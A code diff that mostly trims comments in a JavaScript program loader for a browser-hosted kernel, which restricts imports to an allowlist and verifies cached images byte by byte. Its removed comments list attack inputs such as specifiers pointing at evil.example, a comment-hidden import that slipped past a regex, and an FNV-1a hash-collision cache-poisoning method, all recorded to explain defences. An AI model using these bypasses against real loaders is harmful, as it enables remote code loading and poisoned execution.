@@ -1,149 +1,55 @@
-// `exec`: a program path becomes a loadable image, THROUGH THE FILESYSTEM.
-//
-// ======================================================================================
-// WHY THIS FILE EXISTS, and it is not only that M5 wants ten programs in `/usr/bin`.
-//
-// Until M5, `SYS_spawn` handed its caller's path to `fetch()`:
-//
-//     const url = new URL(programUrl, self.location.href)      // src/kernel/kernel.mjs, M1..M4b
-//
-// A PROCESS-SUPPLIED STRING BECAME A REQUEST ORIGIN. `new URL("https://elsewhere/x.mjs", base)`
-// ignores the base, so any process could name any host, have the kernel fetch it from the
-// browser's network position, and have the kernel EVALUATE the result as a program. That is both
-// the SSRF primitive `src/kernel/providers.mjs` is written to deny — "there is no path by which a
-// process-supplied string becomes a request origin" — and arbitrary remote code load, in the one
-// call that creates processes. Constraint 123 records it.
-//
-// So the rule here is the provider table's own rule, applied to programs: the only bytes this
-// kernel will run are bytes it read out of a mounted filesystem. A path is resolved through the
-// mount table, the execute bit is checked against the caller's credential, and the bytes come from
-// the mount. Nothing reaches the network. `/usr`'s own bytes DID come over HTTP, at boot, from a
-// committed manifest under a provider id a process cannot name (src/kernel/providerfs.mjs) — that
-// is the mount's business, settled before any process exists.
-//
-// THE PAGE'S OWN `t: "spawn"` KEEPS ITS URL and keeps fetching. The page is the supervisor: it is
-// outside the process boundary, it already holds the kernel's whole surface, and a supervisor that
-// could not load a program from the repository could not boot a bench at all. The distinction is
-// the one that matters — privilege, not convenience — and it is why the two paths are separate
-// functions rather than one with a flag.
-// ======================================================================================
+// `exec`: a program path becomes a loadable image, out of a mounted filesystem only. Nothing here
+// reaches the network, in the one call that creates processes (constraint 123).
 
 import { EFBIG, EIO, EISDIR, ENOEXEC, MAX_INLINE, fnv1a } from "../abi.mjs";
 import { FILE } from "../fs/vfs.mjs";
 import { errnoOfFsError } from "./store.mjs";
 import { resolveMount, credOf } from "./calls.mjs";
 
-/**
- * The largest program this kernel will load, in bytes.
- *
- * A BOUND AND NOT A GUESS AT WHAT IS REASONABLE: the bytes are read into the kernel's own heap and
- * then into a Blob, so an unbounded program is a process allocating kernel memory with no cap —
- * the same hazard `OPEN_MAX` and `PROC_CAP` exist for. 1 MiB is ~7x the largest module in this
- * repository (`src/kernel/kernel.mjs`, 73 KiB), so no real program meets it, and EFBIG names what
- * happened rather than leaving a truncated image to fail as a syntax error.
- */
+/** The largest program this kernel will load. The bytes land in the kernel's own heap and then in
+ *  a Blob, so an unbounded program is a process allocating kernel memory. 1 MiB is ~7x the largest
+ *  module in this repository (`src/kernel/kernel.mjs`, 73 KiB). */
 export const PROGRAM_MAX = 1024 * 1024;
 
-/**
- * One chunk of a durable-volume read. MAX_INLINE, because that is the one buffer size this ABI
- * already agrees on, and a read of a shared SAB view has to name a length the other side will
- * accept.
- */
+/** One chunk of a durable-volume read. MAX_INLINE, the one buffer size this ABI already agrees on. */
 export const EXEC_CHUNK = MAX_INLINE;
 
 /**
- * How many bytes of linked program images the kernel keeps.
- *
- * A BOUND, and it is a bound on a hostile loop rather than a tuning knob. `PROGRAM_MAX` caps ONE
- * image and nothing capped their number: a process writing a 1 MiB program to `/tmp` with one byte
- * varied and spawning it in a loop retained a Blob and a blob URL per iteration — ~1 GiB after a
- * thousand turns, and the renderer dies and takes every process with it, which is constraint 17's
- * failure mode reached through storage instead of workers.
- *
- * 8 MiB is ~47x the whole of `/usr/bin` as it stands (169 KiB over 14 objects), so no real
- * workload evicts anything.
+ * How many bytes of linked program images the kernel keeps. `PROGRAM_MAX` caps ONE image and this
+ * caps their number: without it a process spawning a 1 MiB program in a loop with one byte varied
+ * retains a Blob and a blob URL per iteration, constraint 17's failure mode reached through
+ * storage. 8 MiB is ~47x the whole of `/usr/bin` as it stands (169 KiB over 14 objects).
  */
 export const IMAGE_CACHE_BYTES = 8 * 1024 * 1024;
 
-/**
- * The I/O worker's view id for the kernel's own loader buffer.
- *
- * NEGATIVE ON PURPOSE. `src/kernel/iocore.mjs` keys registered SABs by pid, pids are monotonic
- * from 1, and a negative key therefore cannot ever be a process's — so a program read cannot
- * land in a process's byte region, and a process cannot name this buffer in any call.
- */
+/** The I/O worker's view id for the kernel's own loader buffer. NEGATIVE ON PURPOSE:
+ *  `src/kernel/iocore.mjs` keys registered SABs by pid and pids are monotonic from 1, so a program
+ *  read cannot land in a process's byte region and no process can name this buffer. */
 export const EXEC_VIEW_ID = -1;
 
 /**
- * THE SPECIFIERS A PROGRAM MAY IMPORT. An ALLOWLIST of exact literals, and nothing else loads.
+ * THE SPECIFIERS A PROGRAM MAY IMPORT, matched by EQUALITY. Anything else is -ENOEXEC with the
+ * specifier named, and `new URL` is never called on process-controlled text (constraint 123).
  *
- * ======================================================================================
- * AN ALLOWLIST AND NOT A PATTERN, because a pattern was tried and it leaked. The first version
- * rewrote any `/…`-shaped specifier through `new URL(specifier, base)` and refused relative ones.
- * `new URL` RESOLVES A SCHEME-RELATIVE SPECIFIER OFF-ORIGIN — measured against
- * `http://localhost:8000/www/m5.html`:
+ * EACH ENTRY MUST ALSO BE IMPORTED BY `src/libos/process.mjs`: a module no process has already
+ * imported is fetched once per spawned process, the herd `src/kernel/kernel.mjs` measured losing 6
+ * of 480 connections to.
  *
- *     "//evil.example/p.mjs"    ->  http://evil.example/p.mjs
- *     "/\\evil.example/p.mjs"   ->  http://evil.example/p.mjs      (a backslash is a slash here)
- *     "///x"                    ->  http://x/
- *     "/admin/whatever"         ->  an arbitrary GET on the page's own origin
- *
- * and a bare `https://elsewhere/q.mjs` was not matched at all, so it travelled into the Blob
- * verbatim and the CHILD's module loader fetched it. Four syscalls from any process — write a
- * program to `/tmp` whose text says `import "//elsewhere/p.mjs"`, chmod it, spawn it — and the
- * kernel never calls `fetch` while the renderer loads and evaluates remote code on its behalf.
- * Constraint 123 says what that costs; the loader's own accounting stayed at zero loads, which is
- * the worst property a security fix can have.
- *
- * So: every specifier in the text is extracted and compared against this set by EQUALITY. A
- * specifier that is not in it is -ENOEXEC with the specifier named. There is no URL construction
- * on process-controlled text any more — the only strings `new URL` ever sees are the literals
- * below, which are written here.
- *
- * EACH ENTRY MUST ALSO BE IMPORTED BY `src/libos/process.mjs`, which is the other half of the
- * reason the list is this short: a module no process has already imported would be fetched once
- * per spawned process, which is the herd `src/kernel/kernel.mjs` measured losing 6 of 480
- * connections to. Adding a row here without adding the import there buys a fetch per spawn.
- *
- * WHAT THIS DOES NOT CLOSE, stated because the gap is invisible otherwise: a DYNAMIC
- * `import(expr)` whose argument is computed at run time cannot be caught by reading the text, and
- * no scanner can. The literal forms are caught — `import("…")` goes through the same extraction —
- * but `import("htt" + "ps://…")` does not. Recorded as constraint 139.
- *
- * M6 CLOSED IT, and not where 139 said it would. A Content-Security-Policy is the answer, but it
- * has to be delivered on the response that creates the PROCESS REALM — `src/libos/process.mjs` —
- * and not on the document: a document policy was measured to change nothing at all for a
- * dedicated module worker's loader (`bench/m6-realm/csp-probe.py`, constraints 187 and 188).
- * `scripts/serve.py` sends it over `src/libos/`, and `src/libos/lockdown.mjs` is the other half.
- * ======================================================================================
+ * A DYNAMIC `import(expr)` computed at run time is catchable by no scanner, this one included
+ * (constraint 139). The other half is a Content-Security-Policy on the response that creates the
+ * PROCESS REALM; a policy on the document does nothing for a module worker's loader (187, 188).
  */
 export const PROGRAM_IMPORTS = Object.freeze(["/src/abi.mjs"]);
 
 /**
- * EVERY string literal that follows `from`, `import` or `import(` — found by SCANNING, not by a
- * regex over the raw text.
- *
- * A REGEX CANNOT DO THIS, and the one that used to be here is why. It read
- * `(\bfrom\s*|\bimport\s*\(?\s*)(["'])([^"']*)\2`, so the keyword and the quote had to be
- * separated by whitespace only — and a COMMENT IS NOT WHITESPACE. Measured against the real
- * loader: `import "//evil.example/p.mjs"` was refused, while the same line with an empty block
- * comment wedged between the keyword and the quote PASSED, with `resolved` 0 and the off-origin
- * specifier in the returned text verbatim. Same for a comment between `from` and the quote. That
- * is the defect this file's header records as already fixed once, reachable again through a
- * four-character comment — and `resolved` going to 0 rather than to an error means the counter
- * the header offers as the tell does not fire.
- *
- * So the text is walked ONCE, tracking the four lexical states a specifier can hide behind:
- * a line comment, a block comment, and the two string quotes. Comments are skipped rather than
- * trusted, and a string is only treated as a specifier when the last significant token before it
- * was `import`, `from`, or `import (`. Single pass, no backtracking, nothing nested.
- *
- * It still over-matches in the safe direction: a template literal or a string in a position this
- * scanner reads as post-`import` is refused by name rather than passed unchecked.
+ * Every string literal following `from`, `import` or `import(`. The text is walked once, tracking
+ * the lexical states a specifier can hide behind, because A COMMENT IS NOT WHITESPACE: a regex
+ * wanting only whitespace between the keyword and the quote passes an off-origin specifier hidden
+ * behind an empty block comment, with `resolved` 0 rather than an error.
  */
 function specifiersIn(text) {
   const found = [];
-  let token = "";          // the identifier being accumulated
+  let token = "";
   let lastKeyword = "";    // `import` or `from`, if that was the last significant token
   let member = false;      // the identifier is a property access, so it is not the keyword
   let i = 0;
@@ -162,7 +68,6 @@ function specifiersIn(text) {
       continue;
     }
     if (c === '"' || c === "'" || c === "`") {
-      // Walk the literal, honouring backslash escapes so a `\"` does not end it early.
       let j = i + 1;
       let body = "";
       while (j < text.length && text[j] !== c) {
@@ -175,26 +80,22 @@ function specifiersIn(text) {
       i = j + 1;
       continue;
     }
-    // AN IDENTIFIER'S CONTINUATION INCLUDES DIGITS, and leaving them out is not cosmetic: with
-    // the start class used for both, `packI64` left `packI` in the accumulator and the digits
-    // fell through to the catch-all, so the next identifier appended to it. `} from "…"` after
-    // `packI64,` became the token `packIfrom`, the `from` keyword was never seen, and the real
-    // specifier went unchecked and unrewritten — measured on bench/m4-fs/program.mjs.
+    // AN IDENTIFIER'S CONTINUATION INCLUDES DIGITS: with the start class used for both, `packI64,`
+    // leaves `packI` in the accumulator, the following `} from "…"` becomes the token `packIfrom`,
+    // and the real specifier goes unchecked and unrewritten.
     const starts = /[A-Za-z_$]/.test(c);
     if (starts || (token !== "" && /[0-9]/.test(c))) {
       token += c;
       i += 1;
       // The keyword only counts once the identifier has ended, so `imported` is not `import`.
       if (i >= text.length || !/[A-Za-z0-9_$]/.test(text[i])) {
-        // A PROPERTY ACCESS IS NEVER A SPECIFIER KEYWORD. Without this, `Array.from("abc")` is
-        // refused as an unknown specifier `abc` — over-matching in the safe direction, but a
-        // refusal naming a string the program never imported sends the reader somewhere wrong.
+        // A property access is never the keyword, or `Array.from("abc")` is refused as an unknown
+        // specifier `abc` — a refusal naming a string the program never imported.
         lastKeyword = !member && (token === "import" || token === "from") ? token : "";
         token = "";
       }
       continue;
     }
-    // Any other character ends an identifier, so the accumulator must not survive it.
     token = "";
     // `import (` and `import(` keep the keyword live; anything else significant clears it.
     if (!/[\s(]/.test(c)) lastKeyword = "";
@@ -205,17 +106,10 @@ function specifiersIn(text) {
 }
 
 /**
- * Link a program: every specifier checked against the allowlist, then rewritten to the absolute
- * URL the libos already has in its module map. PURE over (text, base).
- *
- * `resolved` is returned rather than assumed so a check can assert the count: a loader that
- * silently stopped rewriting would leave every program importing nothing and failing identically.
- * `unlinkable` names the FIRST refused specifier, because a refusal that does not say which string
- * it refused is the afternoon constraint 125 records.
- *
- * Rewriting is done by SLICING at the offsets the scanner recorded, right to left, so the text a
- * specifier was found in is the text that gets edited. A second regex pass here would reintroduce
- * the gap the scanner exists to close.
+ * Every specifier checked against the allowlist, then rewritten to the absolute URL the libos
+ * already has in its module map. `resolved` is the count a check asserts; `unlinkable` names the
+ * FIRST refused specifier (constraint 125). Rewriting slices at the scanner's offsets, right to
+ * left, so no second pass reintroduces the gap the scanner exists to close.
  */
 export function linkProgram(text, base) {
   const found = specifiersIn(text);
@@ -233,42 +127,22 @@ export function linkProgram(text, base) {
   return { code, resolved: found.length, unlinkable: "" };
 }
 
-/** `fatal` so a file that is not UTF-8 is -ENOEXEC here rather than U+FFFD inside the child.
- *  With `fatal: false` the decoder never throws, so the ENOEXEC arm below could not be reached
- *  and a non-UTF-8 file with an execute bit faulted at module load having issued no syscall. */
+/** `fatal` so a file that is not UTF-8 is -ENOEXEC here rather than U+FFFD inside a child that
+ *  faults at module load having issued no syscall. */
 const DECODER = new TextDecoder("utf-8", { fatal: true });
 
 /**
- * The exec loader.
- *
- * @param {object} ctx
- * @param {() => object} ctx.mounts   the live mount table — a getter, because it is built after
- *                                    this is constructed at boot.
- * @param {() => object} ctx.store    the live Store, for the durable volume.
- * @param {() => Uint8Array} ctx.execView  the kernel's loader buffer, a view on the SAB registered
- *                                    with the I/O worker under EXEC_VIEW_ID.
- * @param {string} ctx.base           the URL absolute specifiers resolve against.
- * @param {(why: string) => void} [ctx.note]
+ * The exec loader. `ctx.mounts`, `ctx.store` and `ctx.execView` are getters because they are built
+ * after this is constructed at boot; `ctx.base` is the URL absolute specifiers resolve against.
  */
 export function makeExec(ctx) {
   /**
-   * CONTENT-ADDRESSED, not path-addressed, and the HASH IS NOT TRUSTED ON ITS OWN.
+   * CONTENT-ADDRESSED, and THE HASH IS NOT TRUSTED ON ITS OWN: a hit is confirmed by comparing the
+   * bytes, because FNV-1a-32 is trivially collidable and the dangerous direction is POISONING — an
+   * unprivileged process writes a file whose hash and length match a program in `/usr/bin`, execs
+   * it once, and a later `spawn` of the real program by any process runs the attacker's text.
    *
-   * A path key would serve a stale image after the file behind it changed, which is exactly what a
-   * shell writing a program and then running it does. Hashing the bytes means a rewritten program
-   * gets a new entry with no invalidation logic to get wrong.
-   *
-   * BUT A HIT IS CONFIRMED BY COMPARING THE BYTES, because FNV-1a-32 is trivially collidable: a
-   * meet-in-the-middle over four tail bytes finds a same-length collision in milliseconds, and the
-   * dangerous direction is POISONING rather than reuse. An unprivileged process writes a 38-byte
-   * file whose hash and length match a program in `/usr/bin`, execs it once, and the Map then holds
-   * its bytes under that key — so a LATER `spawn` of the real program, from any process including
-   * a root shell, runs the attacker's text. The mount, the permission check and the read would all
-   * have behaved correctly and the Map would have decided what ran. The compare is O(n) on a hit
-   * only, and it is exact; the hash is reduced to what it should be, an index.
-   *
-   * The Blob is never revoked while its entry lives: a process may still be importing it, and only
-   * eviction ends that. Eviction is by insertion order and never touches the entry just added.
+   * The Blob is never revoked while its entry lives: a process may still be importing it.
    */
   const images = new Map();
   let cachedBytes = 0;
@@ -280,20 +154,14 @@ export function makeExec(ctx) {
   let durableReads = 0;
   let durableWaits = 0;
 
-  /** Whether two byte arrays are equal. The whole of what makes a cache hit trustworthy. */
   function sameBytes(a, b) {
     if (a.length !== b.length) return false;
     for (let i = 0; i < a.length; i += 1) if (a[i] !== b[i]) return false;
     return true;
   }
 
-  /**
-   * Keep the cache under its ceiling, oldest first, and REVOKE what goes.
-   *
-   * `keep` is the key just inserted and is never evicted: a program is imported by its child
-   * immediately after `spawn` returns, so revoking the entry this load just made would break the
-   * spawn that paid for it.
-   */
+  /** Oldest first, revoking what goes. `keep` is the key just inserted and is never evicted: the
+   *  child imports it immediately after `spawn` returns. */
   function evictTo(limit, keep) {
     for (const [key, image] of images) {
       if (cachedBytes <= limit) return;
@@ -305,22 +173,14 @@ export function makeExec(ctx) {
     }
   }
 
-  /**
-   * THE LOADER BUFFER IS SHARED AND THE READS ARE ASYNC, so they are serialized here.
-   *
-   * Two processes calling `SYS_spawn` in the same tick are two `later()` bodies that interleave at
-   * every await, and both would read into offset 0 of the one SAB the I/O worker knows about: each
-   * load would assemble a mixture of the two programs, and the result would be a syntax error
-   * naming a line in neither file. A promise chain is the whole of the fix — a second buffer per
-   * load would also work and would cost a SharedArrayBuffer allocation plus a register/unregister
-   * round trip per exec, for a path that is already awaiting storage.
-   */
+  /** THE LOADER BUFFER IS SHARED AND THE READS ARE ASYNC, so they are serialized here: two
+   *  `SYS_spawn` bodies interleaving at their awaits both read into offset 0 of the one SAB the I/O
+   *  worker knows about, and each would assemble a mixture of the two programs. */
   let gate = Promise.resolve();
 
   function locked(body) {
     const run = gate.then(body, body);
-    // The chain must not break on a rejection, or every later exec waits on a settled-rejected
-    // promise and throws something it did not do.
+    // The chain must not break on a rejection, or every later exec throws something it did not do.
     gate = run.then(() => {}, () => {});
     return run;
   }
@@ -331,10 +191,8 @@ export function makeExec(ctx) {
     if (typeof at === "number") return at;
     let decision;
     try {
-      // wantX IS THE EXEC CHECK, and it runs inside the filesystem that owns the file so that
-      // there is ONE implementation of the mode bits (src/fs/vfs.mjs `#may`). A check written here
-      // would be a second permission model, and the two would disagree about group ownership on
-      // the first file that had any.
+      // wantX IS THE EXEC CHECK, run inside the filesystem that owns the file so the mode bits
+      // have one implementation (src/fs/vfs.mjs `#may`).
       decision = at.mount.fs.openDecision(credOf(p), at.rel, { wantR: true, wantX: true });
     } catch (error) {
       return errnoOfFsError(error);
@@ -346,8 +204,6 @@ export function makeExec(ctx) {
       bytesRead += decision.bytes.length;
       return decision.bytes;
     }
-    // `decision.type !== FILE` is handled by the filesystems themselves: both throw EISDIR for a
-    // directory when `dirOk` is unset, so a caller cannot reach here with one.
     if (decision.tmpfs) {
       const size = at.mount.fs.size(decision.ino);
       if (size > PROGRAM_MAX) return -EFBIG;
@@ -365,28 +221,20 @@ export function makeExec(ctx) {
     return locked(() => readDurable(decision));
   }
 
-  /** Whether a durable read is in flight right now. A COUNTER'S INPUT, not a control flow: it is
-   *  how "two execs overlapped and the lock held" becomes a number a check can assert instead of
-   *  a claim about a race nobody observed. */
+  /** A COUNTER'S INPUT, not control flow: how "two execs overlapped and the lock held" becomes a
+   *  number a check can assert. */
   let inDurable = false;
 
   function gatePending() {
     return inDurable;
   }
 
-  /**
-   * A program on the OPFS volume.
-   *
-   * THE READ GOES THROUGH THE SAME `Store.readFd` EVERY `read(2)` GOES THROUGH, into a SAB the
-   * kernel owns instead of a process's. Reaching for the blob directly would be a second reader
-   * of a file's extent, and `src/kernel/store.mjs` records what that costs: an unclamped read
-   * hands back bytes above the published size that nobody committed.
-   */
+  /** A program on the OPFS volume, read through the same `Store.readFd` every `read(2)` goes
+   *  through: a second reader of a file's extent would hand back bytes above the published size
+   *  that nobody committed (src/kernel/store.mjs). */
   async function readDurable(decision) {
     const store = ctx.store();
-    // Unreachable in a booted kernel — the mount table is only built when the volume mounted — and
-    // -EIO rather than a throw, because the honest answer for a kernel that cannot reach storage
-    // is the same one `SYS_open` gives.
+    // -EIO rather than a throw, the answer `SYS_open` gives for storage it cannot reach.
     if (!store) return -EIO;
     inDurable = true;
     try {
@@ -399,42 +247,29 @@ export function makeExec(ctx) {
   async function readDurableHeld(store, decision) {
     const d = await store.openFd(decision);
     if (typeof d === "number") return d;
-    // The fields `Store` expects on a description it did not finish building. `files.mjs`'s F_FILE
-    // row is not involved — nothing here installs an fd — but `readFd` reads `d.pos` on the cursor
-    // path, and every read below is POSITIONAL so the cursor is never consulted.
+    // The fields `Store` expects on a description it did not finish building. No fd is installed.
     d.refs = 1;
     d.pos = 0;
     try {
-      /* EVERY CHUNK UNDER ONE INODE LOCK, and that is a correctness requirement rather than a
-       * performance choice. `readFd` takes the lock PER CALL, so a two-chunk program read could be
-       * interleaved by another process's `fsync` of the same file: chunk 0 from generation n and
-       * chunk 1 from generation n+1, spliced into a module that exists in no file and then hashed,
-       * cached and run. Linux cannot produce this — the image is pinned and a write to a running
-       * executable is ETXTBSY — and the equivalent here is to hold the inode for the whole read.
-       * `readHeld` is `readFd`'s body without the lock, which is the same pattern store.mjs uses
-       * internally. */
+      /* EVERY CHUNK UNDER ONE INODE LOCK, a correctness requirement: `readFd` takes the lock PER
+       * CALL, so a two-chunk read interleaved by another process's `fsync` of the same file splices
+       * chunk 0 of generation n to chunk 1 of generation n+1 into a module that exists in no file,
+       * then hashes, caches and runs it. `readHeld` is `readFd`'s body without the lock. */
       return await store.withInode(d.ino, () => readChunks(store, d));
     } finally {
-      /* `release`, NEVER `closeFd`, and the difference is a durable write.
+      /* `release`, NEVER `closeFd`: `closeFd` commits any non-read-only description, and
+       * `commitOnce` with nothing staged publishes the blob's PHYSICAL extent whenever it exceeds
+       * the metadata's size — where another description's un-fsynced append lives. That would
+       * publish a generation and journal it on behalf of a writer that never called `fsync`.
        *
-       * `closeFd` runs `commit(d)` on any non-read-only file description, and `commitOnce` with
-       * nothing staged publishes the blob's PHYSICAL extent whenever it exceeds the metadata's
-       * size — which is exactly where another description's un-fsynced append lives. So closing an
-       * exec's description could publish a generation and append a journal record on behalf of a
-       * writer that never called `fsync`: a call documented as a read mutating the volume.
-       *
-       * This description never wrote, so the only thing `openFd` took that has to be given back is
-       * the handle-row reference it `acquire`d — and `release` is that, under the same lock
-       * `openFd` took it under. The sync access handle is AN EXCLUSIVE LOCK PER FILE
-       * (src/kernel/calls.mjs says what leaking one costs: the file becomes unopenable by
-       * anything, by any process, for the life of the page), so this runs on the throw path too.
-       */
+       * On the throw path too: `openFd` took a handle-row reference, and the sync access handle is
+       * AN EXCLUSIVE LOCK PER FILE, so leaking one makes the file unopenable by any process for
+       * the life of the page (src/kernel/calls.mjs). */
       if (d.type === "file") await store.withInode(d.ino, () => store.release(d.ino));
     }
   }
 
-  /** The chunk loop, under the caller's inode lock. Positional reads only, so `d.pos` is never
-   *  consulted and no two chunks can disagree about which generation they came from. */
+  /** Positional reads only, so `d.pos` is never consulted. */
   async function readChunks(store, d) {
     const view = ctx.execView();
     const parts = [];
@@ -443,13 +278,12 @@ export function makeExec(ctx) {
       const n = await store.readHeld(d, EXEC_VIEW_ID, 0, EXEC_CHUNK, total);
       if (n < 0) return n;
       if (n === 0) break;
-      // COPIED OUT OF THE SHARED VIEW IMMEDIATELY. `slice` on a Uint8Array over a
-      // SharedArrayBuffer returns a non-shared copy; keeping the subarray would alias a buffer
-      // the next chunk overwrites.
+      // `slice` over a SharedArrayBuffer returns a non-shared copy; a subarray would alias a
+      // buffer the next chunk overwrites.
       parts.push(view.slice(0, n));
       total += n;
-      // COUNTED BEFORE THE REFUSAL, so the counter does not go blind on exactly the path a check
-      // would want to measure.
+      // Counted before the cap check, unlike the synth and tmpfs arms: this is bytes read off
+      // storage, not bytes delivered, so a chunk that trips the cap still cost a read.
       bytesRead += n;
       if (total > PROGRAM_MAX) return -EFBIG;
     }
@@ -463,29 +297,20 @@ export function makeExec(ctx) {
   }
 
   return {
-    /**
-     * Load `path` as a program for process `p`. Returns an image, or a NEGATIVE ERRNO.
-     *
-     * @returns {Promise<{url: string, imageUrl: string, bytes: number, resolved: number,
-     *                    hash: number, reused: boolean}|number>}
-     */
+    /** Load `path` as a program for process `p`. An image, or a NEGATIVE ERRNO. */
     async load(p, path) {
       const bytes = await readProgram(p, path);
       if (typeof bytes === "number") return bytes;
       if (bytes.length === 0) {
-        // An empty file is not a program. ENOEXEC and not a module that exports nothing, because
-        // the latter arrives at `program.run` as `undefined is not a function` inside the child.
+        // An empty file is not a program. Loaded, it arrives at `program.run` as `undefined is not
+        // a function`, inside the child.
         return -ENOEXEC;
       }
       const hash = fnv1a(bytes, 0, bytes.length);
       const key = `${hash}:${bytes.length}`;
       const cached = images.get(key);
       if (cached) {
-        // THE HIT IS CONFIRMED AGAINST THE BYTES. A matching hash and length is an index, not an
-        // identity: FNV-1a-32 collides on demand, and a process that poisons this entry would
-        // otherwise choose the code another process runs. A collision is counted and the loader
-        // simply links the real bytes instead — the cache is an optimisation, so losing it costs a
-        // Blob and nothing else.
+        // A collision is counted and the real bytes are linked instead; losing a hit costs a Blob.
         if (sameBytes(cached.source, bytes)) {
           cacheHits += 1;
           return { ...cached, source: undefined, url: path, reused: true };
@@ -505,9 +330,7 @@ export function makeExec(ctx) {
       }
       const { code, resolved, unlinkable } = linkProgram(text, ctx.base);
       if (unlinkable) {
-        // ENOEXEC WITH A NAME. The alternative is the measured one: the blob loads, its import
-        // fails inside the child, and the only trace is a faulted process that never issued a
-        // syscall.
+        // ENOEXEC WITH A NAME: unnamed, the only trace is a faulted process that issued no syscall.
         if (ctx.note) {
           ctx.note(`exec ${path}: relative specifier ${JSON.stringify(unlinkable)} cannot be `
             + "linked into a program image — use an absolute specifier such as /src/abi.mjs");
@@ -517,8 +340,7 @@ export function makeExec(ctx) {
       const image = {
         url: path,
         imageUrl: URL.createObjectURL(new Blob([code], { type: "text/javascript" })),
-        // THE BYTES, kept so a later hit can be confirmed rather than believed. This is what the
-        // cache ceiling is counted against.
+        // Kept so a later hit can be confirmed rather than believed; also what the ceiling counts.
         source: bytes,
         bytes: bytes.length,
         resolved,
@@ -527,23 +349,17 @@ export function makeExec(ctx) {
       images.set(key, image);
       cachedBytes += image.bytes;
       loads += 1;
-      // THE CEILING IS ENFORCED AFTER THE INSERT, never before, so the entry this load just made
-      // is the one entry eviction may not take — its child is about to import it.
       evictTo(IMAGE_CACHE_BYTES, key);
-      // `source` is the cache's copy and is not part of what a caller is handed: a spawn does not
-      // need the program text, and returning it would put a megabyte in a message.
+      // `source` is the cache's copy: returning it would put a megabyte in a message.
       return { ...image, source: undefined, reused: false };
     },
 
-    /** The loader's own counters, so "the program crossed the wire zero times" is a measurement.
-     *  `fetches` is absent deliberately: there is no fetch in this file to count. */
+    /** `fetches` is absent deliberately: there is no fetch in this file to count. */
     stats() {
       return {
         images: images.size, cachedBytes, loads, cacheHits, bytesRead,
         durableReads, durableWaits,
-        // BOTH REFUSAL COUNTERS ARE PUBLISHED, because each is a security property that is
-        // invisible when it holds: a hash collision the loader declined to trust, and an image the
-        // ceiling evicted rather than retaining without bound.
+        // Published because each is a security property invisible when it holds.
         hashCollisions, evictions,
       };
     },
